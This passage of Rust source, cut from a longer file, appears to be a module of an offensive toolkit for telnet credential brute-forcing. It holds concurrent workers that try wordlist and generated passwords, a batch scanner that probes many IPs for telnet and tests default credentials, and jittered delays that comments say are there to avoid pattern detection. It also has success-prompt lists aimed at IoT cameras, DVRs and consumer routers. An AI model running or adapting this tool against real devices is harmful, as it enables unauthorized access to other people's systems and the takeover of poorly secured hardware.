    let stop_flag = Arc::new(AtomicBool::new(false));
    let stats = Arc::new(Statistics::new());

    let channel_buffer = config.threads * CHANNEL_BUFFER_MULTIPLIER;
    let (tx, rx) = mpsc::channel::<(Arc<str>, Arc<str>)>(channel_buffer);

    spawn_producers(
        &config,
        tx,
        use_streaming,
        &usernames,
        &passwords,
        username_count,
        password_count,
        stop_flag.clone(),
    );

    // Use standard Tokio semaphore
    let semaphore = Arc::new(Semaphore::new(config.threads));
    let rx = Arc::new(Mutex::new(rx));
    let mut worker_handles = Vec::with_capacity(config.threads);

    for worker_id in 0..config.threads {
        let h = spawn_worker(
            worker_id,
            rx.clone(),
                             socket_addr,
                             stop_flag.clone(),
                             found_creds.clone(),
                             result_writer.clone(),
                             config.clone(),
                             stats.clone(),
                             semaphore.clone(),
        );
        worker_handles.push(h);
    }

    let progress_handle = spawn_progress_reporter(stats.clone(), stop_flag.clone());

    for (i, h) in worker_handles.into_iter().enumerate() {
        if let Err(e) = h.await {
            eprintln!("[!] Worker {} failed: {}", i, e);
        }
    }

    stop_flag.store(true, Ordering::Relaxed);
    let _ = progress_handle.await;

    // Finalize buffered result writer to ensure all data is written
    if let Err(e) = result_writer.lock().await.finalize().await {
        eprintln!("[!] Failed to finalize result writer: {}", e);
    }

    stats.print_final().await;
    print_final_report(&found_creds, &output_file).await;

    Ok(())
}

// ============================================================
// BATCH SCANNER EXECUTION
// ============================================================

async fn execute_batch_scan(config: BatchScanConfig) -> Result<()> {
    let semaphore = Arc::new(tokio::sync::Semaphore::new(config.max_concurrent));
    let mut tasks = Vec::new();

    println!("Starting scan with {} concurrent tasks...", config.max_concurrent);
    println!();

    for target in config.targets.clone() {
        let sem = semaphore.clone();
        let cfg = config.clone();

        let task = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            scan_target(target, &cfg).await
        });

        tasks.push(task);
    }

    let mut all_results = Vec::new();
    let mut open_ports = 0;
    let mut valid_creds = 0;

    for task in tasks {
        match task.await {
            Ok(results) => {
                open_ports += results.len();
                valid_creds += results.iter().filter(|r| r.credentials.is_some()).count();
                all_results.extend(results);
            }
            Err(e) => {
                println!("{} Task error: {}", "[!]".red(), e);
            }
        }
    }

    println!();
    save_batch_results(&all_results, &config.output_file)?;

    println!();
    println!("{}", "=== Scan Summary ===".bright_blue().bold());
    println!("Targets scanned:       {}", config.targets.len());
    println!("Open telnet ports:     {}", open_ports);
    println!("Valid credentials:     {} {}", valid_creds,
             if valid_creds > 0 { "✓".green() } else { "✗".red() });
    println!("Results saved to:      {}", config.output_file);

    if valid_creds > 0 {
        println!();
        println!("{}", "Valid credentials found:".bright_green().bold());
        for result in &all_results {
            if let Some((u, p)) = &result.credentials {
                println!("  • {}:{} - {}/{}", result.ip, result.port, u,
                         if p.is_empty() { "(blank)" } else { p });
            }
        }
    }

    Ok(())
}

async fn scan_target(ip: String, config: &BatchScanConfig) -> Vec<ScanResult> {
    let mut results = Vec::new();

    for &port in &config.ports {
        if config.verbose {
            println!("{} Scanning {}:{}...", "[*]".cyan(), ip, port);
        }

        let banner = match check_port(&ip, port, config.timeout).await {
            Ok(Some(b)) => b,
            _ => {
                if config.verbose {
                    println!("  {} Port closed", "[✗]".red());
                }
                continue;
            }
        };

        println!("{} {}:{} - Port open", "[+]".green(), ip, port);

        if config.verbose && !banner.is_empty() {
            println!("  [*] Banner: {}", banner.trim());
        }

        let mut found_creds = None;

        for (username, password) in &config.credentials {
            if config.verbose {
                println!("  [*] Trying {}/{}", username,
                         if password.is_empty() { "(blank)" } else { password });
            }

            match try_telnet_login_simple(&ip, port, username, password,
                                          config.timeout.as_secs()).await {
                                              Ok(true) => {
                                                  println!(
                                                      "{} {}:{} - Valid: {}/{}",
                                                      "[✓]".bright_green().bold(),
                                                           ip, port, username,
                                                           if password.is_empty() { "(blank)" } else { password }
                                                  );
                                                  found_creds = Some((username.clone(), password.clone()));
                                                  break;
                                              }
                                              Ok(false) => {
                                                  if config.verbose {
                                                      println!("  {} Invalid", "[✗]".red());
                                                  }
                                              }
                                              Err(e) => {
                                                  if config.verbose {
                                                      println!("  {} Error: {}", "[!]".yellow(), e);
                                                  }
                                              }
                                          }

                                          sleep(Duration::from_millis(100)).await;
        }

        results.push(ScanResult {
            ip: ip.clone(),
                     port,
                     banner: banner.trim().to_string(),
                     credentials: found_creds,
                     timestamp: chrono::Utc::now().to_rfc3339(),
        });
    }

    results
}

async fn check_port(ip: &str, port: u16, timeout_duration: Duration) -> Result<Option<String>> {
    let addr = format!("{}:{}", ip, port);
    let socket: SocketAddr = addr.parse()?;

    let stream = match timeout(timeout_duration, TcpStream::connect(&socket)).await {
        Ok(Ok(s)) => s,
        _ => return Ok(None),
    };

    let mut stream = stream;
    let mut buffer = vec![0u8; 512];

    let banner = match timeout(Duration::from_secs(2), stream.read(&mut buffer)).await {
        Ok(Ok(n)) if n > 0 => String::from_utf8_lossy(&buffer[..n]).to_string(),
        _ => String::new(),
    };

    Ok(Some(banner))
}

// ============================================================
// WORKER AND PRODUCER FUNCTIONS
// ============================================================

// ResourceAwareSemaphore removed in favor of standard Tokio Semaphore
// for simplicity and reliability.

fn spawn_worker(
    worker_id: usize,
    rx: Arc<Mutex<mpsc::Receiver<(Arc<str>, Arc<str>)>>>,
                socket_addr: SocketAddr,
                stop_flag: Arc<AtomicBool>,
                found_creds: Arc<Mutex<HashSet<(String, String)>>>,
                result_writer: Arc<Mutex<BufferedResultWriter>>,
                config: TelnetBruteforceConfig,
                stats: Arc<Statistics>,
                semaphore: Arc<Semaphore>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        loop {
            if stop_flag.load(Ordering::SeqCst) {
                if config.verbose {
                    println!("[*] Worker {} stopping (stop flag set)", worker_id);
                }
                break;
            }

            let pair = loop {
                // Try to receive message
                let recv_result = {
                    let mut guard = rx.lock().await;
                    guard.try_recv()
                };

                match recv_result {
                    Ok(p) => break Some(p),
                 Err(mpsc::error::TryRecvError::Empty) => {
                     // No message available, wait a bit before trying again
                     // But release the lock first to prevent deadlock
                     sleep(Duration::from_millis(10)).await;

                     // Check stop flag after sleep
                     if stop_flag.load(Ordering::SeqCst) {
                         break None;
                     }
                     continue;
                 }
                 Err(mpsc::error::TryRecvError::Disconnected) => break None,
                }
            };

            let Some((user, pass)) = pair else {
                if config.verbose {
                    println!("[*] Worker {} stopping (channel closed)", worker_id);
                }
                break;
            };

            // DNS resolution is now done once before spawning workers
            let socket = socket_addr;

            // Atomically check stop flag and acquire permit to prevent race condition
            let _permit = match semaphore.acquire().await {
                Ok(permit) => permit,
                 Err(_) => {
                     eprintln!("[!] Worker {} failed to acquire semaphore permit", worker_id);
                     break;
                 }
            };

            // Check stop flag after acquiring permit but before starting work
            if stop_flag.load(Ordering::SeqCst) {
                if config.verbose {
                    println!(
                        "[*] Worker {} dropping work {}:{} (stopped)",
                             worker_id,
                             sanitize_input(user.as_ref()),
                             sanitize_input(pass.as_ref())
                    );
                }
                drop(_permit); // Explicitly drop permit to release it
                break;
            }

            if stop_flag.load(Ordering::SeqCst) {
                if config.verbose {
                    println!(
                        "[*] Worker {} aborting attempt {}:{} (stopped)",
                             worker_id,
                             sanitize_input(user.as_ref()),
                             sanitize_input(pass.as_ref())
                    );
                }
                break;
            }

            if config.verbose {
                println!(
                    "{} [Worker {}] Trying {}:{}",
                    "[*]".bright_blue(),
                         worker_id,
                         sanitize_input(user.as_ref()),
                         sanitize_input(pass.as_ref())
                );
            }

            // Watchdog around the full login attempt
            let attempt_future = try_telnet_login(&socket, &user, &pass, &config);
            let mut attempt_result = match timeout(Duration::from_secs(TASK_WATCHDOG_TIMEOUT_SECS), attempt_future).await {
                Ok(res) => res,
                 Err(_) => {
                     // Don't count as regular attempt since it never completed
                     stats.record_hung_task();
                     stats.record_error_kind("Task watchdog timeout").await;
                     if config.verbose {
                         eprintln!(
                             "{}",
                             format!(
                                 "[!] Worker {}: attempt {}:{} hung (watchdog timeout)",
                                     worker_id, user, pass
                             )
                                 .yellow()
                         );
                     }
                     continue;
                 }
            };

            let mut retry_count = 0;
            while config.retry_on_error && retry_count < config.max_retries && attempt_result.is_err() {
                if stop_flag.load(Ordering::SeqCst) {
                    break;
                }

                retry_count += 1;
                stats.record_retry();
                stats.record_retry_queued();

                // Exponential backoff with jitter to avoid pattern detection
                let base_delay = config.delay_ms;
                let backoff_multiplier = (1u64 << retry_count).min(8); // Cap at 8x
                let backoff_delay = base_delay * backoff_multiplier;

                // Add jitter: randomize between 0% and 50% of the delay
                let jitter_range = backoff_delay / 2;
                let jitter = rand::rng().random_range(0..=jitter_range);
                let total_delay = backoff_delay + jitter;

                sleep(Duration::from_millis(total_delay)).await;
                let retry_future = try_telnet_login(&socket, &user, &pass, &config);
                attempt_result = match timeout(Duration::from_secs(TASK_WATCHDOG_TIMEOUT_SECS), retry_future).await {
                    Ok(res) => res,
                 Err(_) => {
                     // Don't count as regular attempt since it never completed
                     stats.record_hung_task();
                     stats.record_error_kind("Task watchdog timeout").await;
                     if config.verbose {
                         eprintln!(
                             "{}",
                             format!(
                                 "[!] Worker {}: retry attempt {}:{} hung (watchdog timeout)",
                                     worker_id, user, pass
                             )
                                 .yellow()
                         );
                     }
                     break;
                 }
                };
            }

            match attempt_result {
                Ok(true) => {
                    stats.record_attempt(true, false);

                    let mut creds = found_creds.lock().await;
                    if creds.insert((user.to_string(), pass.to_string())) {
                        drop(creds);

                        println!(
                            "\n{}",
                            format!(
                                "[+] VALID: {}:{}",
                                sanitize_input(user.as_ref()),
                                    sanitize_input(pass.as_ref())
                            )
                                .green()
                                .bold()
                        );

                        if let Err(e) = result_writer.lock().await.write_result(&user, &pass).await {
                            eprintln!("[!] Failed to write result: {}", e);
                        }

                        if config.stop_on_success {
                            stop_flag.store(true, Ordering::SeqCst);

                            let mut rx_guard = rx.lock().await;
                            let mut drained = 0;
                            while rx_guard.try_recv().is_ok() {
                                drained += 1;
                            }
                            drop(rx_guard);

                            if config.verbose && drained > 0 {
                                println!("[*] Worker {} drained {} queued attempts", worker_id, drained);
                            }

                            println!("[*] Worker {} stopping (success, stop_on_success=true)", worker_id);
                            break;
                        }
                    }
                }
                Ok(false) => {
                    stats.record_attempt(false, false);
                    if config.verbose {
                        println!(
                            "{} Failed: {}:{}",
                            "[-]".red(),
                                 sanitize_input(user.as_ref()),
                                 sanitize_input(pass.as_ref())
                        );
                    }
                }
                Err(e) => {
                    stats.record_attempt(false, true);
                    let msg = e.to_string();
                    let kind = classify_telnet_error(&msg);
                    match kind {
                        "Read/Connection timeout" => stats.record_timeout(),
                 "Broken pipe" => stats.record_broken_pipe(),
                 _ => {}
                    }
                    stats.record_error_kind(kind).await;
                    if config.verbose {
                        eprintln!(
                            "{} Error ({}): {}:{}",
                                  "[!]".yellow(),
                                  msg,
                                  sanitize_input(user.as_ref()),
                                  sanitize_input(pass.as_ref())
                        );
                    }
                }
            }

            if config.delay_ms > 0 {
                // Add jitter to avoid pattern detection: randomize between 75% and 125% of base delay
                let base_delay = config.delay_ms;
                let jitter_range = base_delay / 4; // 25% variation
                let min_delay = base_delay.saturating_sub(jitter_range);
                let max_delay = base_delay.saturating_add(jitter_range);
                let randomized_delay = rand::rng().random_range(min_delay..=max_delay);
                sleep(Duration::from_millis(randomized_delay)).await;
            }
        }
    })
}

fn spawn_progress_reporter(
    stats: Arc<Statistics>,
    stop_flag: Arc<AtomicBool>,
) -> tokio::task::JoinHandle<()> {
    tokio::spawn(async move {
        let mut interval = tokio::time::interval(Duration::from_secs(PROGRESS_INTERVAL_SECS));
        loop {
            interval.tick().await;
            if stop_flag.load(Ordering::Relaxed) {
                break;
            }
            stats.print_progress();
        }
    })
}

fn spawn_producers(
    config: &TelnetBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                   use_streaming: bool,
                   usernames: &[String],
                   passwords: &[String],
                   username_count: usize,
                   password_count: usize,
                   stop_flag: Arc<AtomicBool>,
) {
    if use_streaming {
        spawn_streaming_producers(config, tx.clone(), username_count, password_count, stop_flag.clone());
    } else {
        spawn_memory_producers(config, tx.clone(), usernames, passwords, stop_flag.clone());
    }
    drop(tx);
}

// src/modules/creds/generic/telnet_bruteforce.rs - PART 3/4
// Producer Functions and Combo Generation Logic

fn spawn_streaming_producers(
    config: &TelnetBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                             username_count: usize,
                             password_count: usize,
                             stop_flag: Arc<AtomicBool>,
) {
    if password_count > 0 {
        let password_path = match config.password_wordlist.clone() {
            Some(path) => path,
            None => {
                eprintln!("[!] Password wordlist required but not configured");
                return;
            }
        };
        let username_path = config.username_wordlist.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = enqueue_wordlist_combos_streaming(
                tx_clone, &username_path, &password_path, full_combo,
                stop_clone, username_count, password_count,
            ).await {
                eprintln!("[!] Wordlist producer error: {}", e);
            }
        });
    }

    if config.raw_bruteforce {
        let charset: Vec<char> = config.raw_charset.chars().collect();
        let min_len = config.raw_min_length;
        let max_len = config.raw_max_length;
        let username_path = config.username_wordlist.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = generate_raw_combos_streaming(
                tx_clone, &username_path, charset, min_len, max_len,
                full_combo, stop_clone, username_count,
            ).await {
                eprintln!("[!] Raw producer error: {}", e);
            }
        });
    }
}

fn spawn_memory_producers(
    config: &TelnetBruteforceConfig,
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                          usernames: &[String],
                          passwords: &[String],
                          stop_flag: Arc<AtomicBool>,
) {
    let usernames_arc: Vec<Arc<str>> = usernames.iter().map(|s| Arc::from(s.as_str())).collect();
    let passwords_arc: Vec<Arc<str>> = passwords.iter().map(|s| Arc::from(s.as_str())).collect();

    if !passwords_arc.is_empty() {
        let passwords_clone = passwords_arc.clone();
        let usernames_clone = usernames_arc.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = enqueue_wordlist_combos_fast(
                tx_clone, &usernames_clone, &passwords_clone, full_combo, stop_clone,
            ).await {
                eprintln!("[!] Wordlist producer error: {}", e);
            }
        });
    }

    if config.raw_bruteforce {
        let charset: Vec<char> = config.raw_charset.chars().collect();
        let min_len = config.raw_min_length;
        let max_len = config.raw_max_length;
        let usernames_clone = usernames_arc.clone();
        let full_combo = config.full_combo;
        let tx_clone = tx.clone();
        let stop_clone = stop_flag.clone();
        tokio::spawn(async move {
            if let Err(e) = generate_raw_combos(
                tx_clone, &usernames_clone, charset, min_len, max_len, full_combo, stop_clone,
            ).await {
                eprintln!("[!] Raw producer error: {}", e);
            }
        });
    }
}

// ============================================================
// COMBO GENERATION FUNCTIONS
// ============================================================

#[inline]
async fn enqueue_wordlist_combos_fast(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                                      usernames: &[Arc<str>],
                                      passwords: &[Arc<str>],
                                      full_combo: bool,
                                      stop_flag: Arc<AtomicBool>,
) -> Result<()> {
    if passwords.is_empty() {
        return Ok(());
    }

    if full_combo {
        for user in usernames {
            if stop_flag.load(Ordering::Relaxed) { break; }
            for pass in passwords {
                if stop_flag.load(Ordering::Relaxed) { break; }
                tx.send((user.clone(), pass.clone())).await.ok();
            }
        }
    } else if usernames.len() == 1 {
        let user = &usernames[0];
        for pass in passwords {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    } else if passwords.len() == 1 {
        let pass = &passwords[0];
        for user in usernames {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    } else {
        let user = &usernames[0];
        for pass in passwords {
            if stop_flag.load(Ordering::Relaxed) { break; }
            tx.send((user.clone(), pass.clone())).await.ok();
        }
    }

    Ok(())
}

async fn generate_raw_combos(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                             usernames: &[Arc<str>],
                             charset: Vec<char>,
                             min_len: usize,
                             max_len: usize,
                             full_combo: bool,
                             stop_flag: Arc<AtomicBool>,
) -> Result<()> {
    if charset.is_empty() || max_len == 0 {
        return Ok(());
    }

    let base = charset.len();

    for len in min_len..=max_len {
        if stop_flag.load(Ordering::Relaxed) { break; }

        let mut indices = vec![0usize; len];

        loop {
            if stop_flag.load(Ordering::Relaxed) { break; }

            let pwd: String = indices.iter().map(|&i| charset[i]).collect();
            let pwd_arc: Arc<str> = Arc::from(pwd.as_str());

            if full_combo || usernames.len() == 1 {
                for user in usernames {
                    if stop_flag.load(Ordering::Relaxed) { break; }
                    tx.send((user.clone(), pwd_arc.clone())).await.ok();
                }
            } else {
                let user = &usernames[0];
                tx.send((user.clone(), pwd_arc)).await.ok();
            }

            let mut carry = true;
            for i in (0..len).rev() {
                if carry {
                    indices[i] += 1;
                    if indices[i] < base {
                        carry = false;
                    } else {
                        indices[i] = 0;
                    }
                }
            }

            if carry { break; }
        }
    }

    Ok(())
}

async fn enqueue_wordlist_combos_streaming(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                                           username_path: &str,
                                           password_path: &str,
                                           full_combo: bool,
                                           stop_flag: Arc<AtomicBool>,
                                           username_count: usize,
                                           _password_count: usize,
) -> Result<()> {
    if full_combo {
        // Open password file once and cache passwords to avoid reopening file for each username
        let pass_file = File::open(password_path).await?;
        let pass_reader = BufReader::new(pass_file);
        let mut pass_lines = pass_reader.lines();
        let mut passwords = Vec::new();

        while let Some(pass_line) = pass_lines.next_line().await? {
            let pass = pass_line.trim();
            if !pass.is_empty() {
                passwords.push(Arc::<str>::from(pass));
            }
        }

        // Now iterate through usernames and send combinations
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();

        while let Some(user_line) = user_lines.next_line().await? {
            let user = user_line.trim();
            if user.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let user_arc: Arc<str> = Arc::from(user);

            // Send combinations for this user with all passwords
            for pass_arc in &passwords {
                if stop_flag.load(Ordering::Relaxed) {
                    return Ok(());
                }
                tx.send((user_arc.clone(), pass_arc.clone())).await.ok();
            }
        }
    } else if username_count == 1 {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();
        let user_line = user_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
        let user_arc: Arc<str> = Arc::from(user_line.trim());

        let pass_file = File::open(password_path).await?;
        let pass_reader = BufReader::new(pass_file);
        let mut pass_lines = pass_reader.lines();

        while let Some(pass_line) = pass_lines.next_line().await? {
            let pass = pass_line.trim();
            if pass.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let pass_arc: Arc<str> = Arc::from(pass);
            tx.send((user_arc.clone(), pass_arc)).await.ok();
        }
    } else {
        let pass_file = File::open(password_path).await?;
        let pass_reader = BufReader::new(pass_file);
        let mut pass_lines = pass_reader.lines();
        let pass_line = pass_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
        let pass_arc: Arc<str> = Arc::from(pass_line.trim());

        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();

        while let Some(user_line) = user_lines.next_line().await? {
            let user = user_line.trim();
            if user.is_empty() || stop_flag.load(Ordering::Relaxed) {
                continue;
            }
            let user_arc: Arc<str> = Arc::from(user);
            tx.send((user_arc, pass_arc.clone())).await.ok();
        }
    }

    Ok(())
}

async fn generate_raw_combos_streaming(
    tx: mpsc::Sender<(Arc<str>, Arc<str>)>,
                                       username_path: &str,
                                       charset: Vec<char>,
                                       min_len: usize,
                                       max_len: usize,
                                       full_combo: bool,
                                       stop_flag: Arc<AtomicBool>,
                                       username_count: usize,
) -> Result<()> {
    if charset.is_empty() || max_len == 0 {
        return Ok(());
    }

    let base = charset.len();

    if full_combo || username_count == 1 {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();
        let mut usernames: Vec<Arc<str>> = Vec::new();

        while let Some(user_line) = user_lines.next_line().await? {
            let user = user_line.trim();
            if !user.is_empty() {
                usernames.push(Arc::from(user));
            }
        }

        for len in min_len..=max_len {
            if stop_flag.load(Ordering::Relaxed) { break; }

            let mut indices = vec![0usize; len];

            loop {
                if stop_flag.load(Ordering::Relaxed) { break; }

                let pwd: String = indices.iter().map(|&i| charset[i]).collect();
                let pwd_arc: Arc<str> = Arc::from(pwd.as_str());

                for user in &usernames {
                    if stop_flag.load(Ordering::Relaxed) { break; }
                    tx.send((user.clone(), pwd_arc.clone())).await.ok();
                }

                let mut carry = true;
                for i in (0..len).rev() {
                    if carry {
                        indices[i] += 1;
                        if indices[i] < base {
                            carry = false;
                        } else {
                            indices[i] = 0;
                        }
                    }
                }

                if carry { break; }
            }
        }
    } else {
        let user_file = File::open(username_path).await?;
        let user_reader = BufReader::new(user_file);
        let mut user_lines = user_reader.lines();
        let user_line = user_lines.next_line().await?.ok_or_else(|| anyhow!("Empty file"))?;
        let user_arc: Arc<str> = Arc::from(user_line.trim());

        for len in min_len..=max_len {
            if stop_flag.load(Ordering::Relaxed) { break; }

            let mut indices = vec![0usize; len];

            loop {
                if stop_flag.load(Ordering::Relaxed) { break; }

                let pwd: String = indices.iter().map(|&i| charset[i]).collect();
                let pwd_arc: Arc<str> = Arc::from(pwd.as_str());

                tx.send((user_arc.clone(), pwd_arc)).await.ok();

                let mut carry = true;
                for i in (0..len).rev() {
                    if carry {
                        indices[i] += 1;
                        if indices[i] < base {
                            carry = false;
                        } else {
                            indices[i] = 0;
                        }
                    }
                }

                if carry { break; }
            }
        }
    }

    Ok(())
}

// ============================================================
// CONFIGURATION FUNCTIONS
// ============================================================

async fn build_interactive_config(target: &str) -> Result<TelnetBruteforceConfig> {
    println!();
    println!("{}", "[Interactive Configuration]".bold().green());
    println!();

    let port = prompt_port(23).await?;
    let threads = prompt_threads(8).await?;
    let delay_ms = prompt_delay(100).await?;
    let connection_timeout = prompt_timeout("Connection timeout (seconds, default 3): ", 3).await?;
    let banner_read_timeout = prompt_timeout("Banner read timeout (seconds, default 2): ", 2).await?;
    let login_prompt_timeout = prompt_timeout("Login prompt timeout (seconds, default 3): ", 3).await?;
    let password_prompt_timeout = prompt_timeout("Password prompt timeout (seconds, default 3): ", 3).await?;
    let auth_response_timeout = prompt_timeout("Auth response timeout (seconds, default 5): ", 5).await?;
    let command_timeout = prompt_timeout("Command timeout (seconds, default 3): ", 3).await?;
    let write_timeout = 500; // Fixed write timeout in milliseconds

    let username_wordlist = prompt_wordlist("Username wordlist file: ").await?;
    let raw_bruteforce = prompt_yes_no("Enable raw brute-force password generation? (y/n): ", false).await?;

    let password_wordlist = if raw_bruteforce {
        prompt_optional_wordlist("Password wordlist (leave blank to skip): ").await?
    } else {
        Some(prompt_wordlist("Password wordlist file: ").await?)
    };

    let (raw_charset, raw_min_length, raw_max_length) = if raw_bruteforce {
        let charset = prompt_charset("Character set (default: lowercase): ", "abcdefghijklmnopqrstuvwxyz").await?;
        let min_len = prompt_min_length(1, 1, 8).await?;
        let max_len = prompt_max_length(4, min_len, 8).await?;
        (charset, min_len, max_len)
    } else {
        (String::new(), 0, 0)
    };

    let full_combo = prompt_yes_no("Try every username with every password? (y/n): ", false).await?;
    let stop_on_success = prompt_yes_no("Stop on first valid login? (y/n): ", false).await?;

    let output_file = prompt_required("Output file: ").await?;
    let append_mode = if tokio::fs::metadata(&output_file).await.is_ok() {
        prompt_yes_no(&format!("File exists. Append? (y/n): "), true).await?
    } else {
        false
    };

    let verbose = prompt_yes_no("Verbose mode? (y/n): ", false).await?;
    let pre_validate = prompt_yes_no("Pre-validate target? (y/n): ", true).await?;
    let retry_on_error = prompt_yes_no("Retry failed connections? (y/n): ", true).await?;
    let max_retries = if retry_on_error { prompt_retries(2).await? } else { 0 };

    let use_custom_prompts = prompt_yes_no("Use custom prompts? (y/n): ", false).await?;

    let (login_prompts, password_prompts, success_indicators, failure_indicators) =
    if use_custom_prompts {
        (
            prompt_list("Login prompts (comma-separated): ").await?,
         prompt_list("Password prompts (comma-separated): ").await?,
         prompt_list("Success indicators (comma-separated): ").await?,
         prompt_list("Failure indicators (comma-separated): ").await?,
        )
    } else {
        get_default_prompts()
    };

    Ok(TelnetBruteforceConfig {
        target: target.to_string(),
       port, username_wordlist, password_wordlist, threads, delay_ms,
       connection_timeout, banner_read_timeout, login_prompt_timeout,
       password_prompt_timeout, auth_response_timeout, command_timeout, write_timeout,
       stop_on_success, verbose, full_combo,
       raw_bruteforce, raw_charset, raw_min_length, raw_max_length,
       output_file, append_mode, pre_validate, retry_on_error, max_retries,
       login_prompts, password_prompts, success_indicators, failure_indicators,
       login_prompts_lower: Vec::new(),
       password_prompts_lower: Vec::new(),
       success_indicators_lower: Vec::new(),
       failure_indicators_lower: Vec::new(),
    })
}

fn get_default_prompts() -> (Vec<String>, Vec<String>, Vec<String>, Vec<String>) {
    (
        // Login prompts - English + Multi-language support
        vec![
            // English
            "login:".to_string(), "username:".to_string(), "user:".to_string(),
     "user name:".to_string(), "account:".to_string(), "userid:".to_string(),
     // Spanish
     "usuario:".to_string(), "nombre de usuario:".to_string(), "login:".to_string(),
     // French
     "identifiant:".to_string(), "nom d'utilisateur:".to_string(), "connexion:".to_string(),
     // Portuguese
     "usuário:".to_string(), "login:".to_string(), "usuário:".to_string(),
     // German
     "benutzername:".to_string(), "anmeldename:".to_string(), "login:".to_string(),
     // Italian
     "nome utente:".to_string(), "login:".to_string(), "utente:".to_string(),
     // Russian (already had some)
     "логин:".to_string(), "пользователь:".to_string(),
     // Chinese (simplified)
     "用户名:".to_string(), "登录:".to_string(), "用户:".to_string(),
     // Japanese
     "ユーザー名:".to_string(), "ログイン:".to_string(),
     // Arabic
     "اسم المستخدم:".to_string(), "تسجيل الدخول:".to_string(),
        ],

     // Password prompts - English + Multi-language support
     vec![
         // English
         "password:".to_string(), "passwd:".to_string(), "pass:".to_string(),
     "enter password".to_string(), "password for".to_string(),
     // Spanish
     "contraseña:".to_string(), "clave:".to_string(),
     // French
     "mot de passe:".to_string(),
     // Portuguese
     "senha:".to_string(),
     // German
     "passwort:".to_string(),
     // Italian
     "password:".to_string(),
     // Russian
     "пароль:".to_string(),
     // Chinese
     "密码:".to_string(),
     // Japanese
     "パスワード:".to_string(),
     // Arabic
     "كلمة المرور:".to_string(),
     ],

     // Success indicators - English + Multi-language support
     vec![
         // Basic shell prompts
         "$", "#", ">", "~", "%", " # ", " ~# ", " /# ", " ~ # ", " / # ",
     "~ ", "% ", "~$",

     // Common login success / welcome messages (English + multilingual)
     "last login", "welcome", "welcome to", "logged in",
     "login successful", "authentication successful", "successfully authenticated",
     "motd", "message of the day", "have a lot of fun",
     "you have mail", "you have new mail",
     "press any key", "continue", "enter command", "available commands", "type help",

     // User/host prompts
     "user@", "root@", "admin@", "ubuntu", "debian", "centos", "red hat", "fedora",
     "freebsd", "openbsd", "[root@", "[admin@", "bash-", "sh-",
     "root:~#", "root:/#", "root@(none):/#", "root@(none):~#",

     // Network device prompts
     "router>", "router#", "switch>", "switch#",
     "cisco", "ios>", "ios#",

     // Multilingual welcomes (existing + expanded)
     "bienvenido", "conectado", "bienvenue", "connecté", "bem-vindo", "willkommen", "angemeldet",
     "benvenuto", "connesso", "добро пожаловать", "подключен",
     "欢迎", "已连接", "ようこそ", "接続されました",

     // === Chinese IoT / IP camera / router specific (niche, exotic, from real device dumps) ===
     "~ #", "/ #", "~#", "/#",
     "built-in shell (ash)",
     "enter 'help' for a list of built-in commands.",
     "/bin/sh: can't access tty; job control turned off",
     "busybox v",
     "busybox built-in shell",
     "welcome to faraday",
     "welcome to faraday busybox",
     "faraday busybox",
     "[root@gm]#", "root@gm",
     "[root@dvrdvs /]#",
     "dvrdvs#",
     "hi3518", "hi3516", "hi3536", "hisilicon",
     "xm#", "xiongmai#", "xmeye#",
     "gm8136", "gm8135", "grainmedia",
     "<huawei>", "[huawei]", "huawei>", "huawei#",
     "welcome visiting huawei", "huawei home gateway", "huawei terminal",
     "zte>", "zxa", "zxan#", "zxa10#",
     "fiberhome>", "fiberhome#",
     "tp-link>", "tp-link router",
     "tenda>", "tenda technology",
     "xiaoqiang#", "miwifi#", "xiaomi router",
     "欢迎使用", "欢迎登录", "欢迎访问", "欢迎光临", "欢迎来到",
     "欢迎使用本系统", "欢迎使用该终端", "欢迎使用该设备",
     "欢迎您", "欢迎您登录", "您已成功登录",
     "登录成功", "成功登录", "认证成功", "成功认证", "认证通过",
     "已登录", "连接成功", "已连接", "会话已建立",
     "系统就绪", "终端就绪", "终端准备就绪",
     "v380#", "v380 pro#", "yyp2p#",
     "jovision#", "tiandy#", "uniview#",
     "escam#", "besder#", "wanscam#", "vstarcam#",
     "annke#", "sv3c#", "foscam#",
     "comfast#", "wavlink#", "kuwfi#",
     "ipcamera login",
     "ont#", "gpon#", "home gateway",
     "copyright huawei technologies", "copyright (c) huawei",
     "vrp", "versatile routing platform",
     "autenticación exitosa", "login exitoso",
     "authentification réussie", "autenticação bem-sucedida",
     "authentifizierung erfolgreich", "autenticazione riuscita",
     "аутентификация успешна", "认证成功", "認証成功",
     ].iter().map(|s| s.to_string()).collect(),

     // Failure indicators - English + Multi-language support
     vec![
         // English
         "incorrect", "failed", "denied", "invalid", "authentication failed",
     "% authentication", "% bad", "access denied", "login incorrect",
     "permission denied", "not authorized", "authentication error",
     "bad password", "wrong password", "authentication failure",
     "login failed", "invalid login", "invalid password", "invalid username",
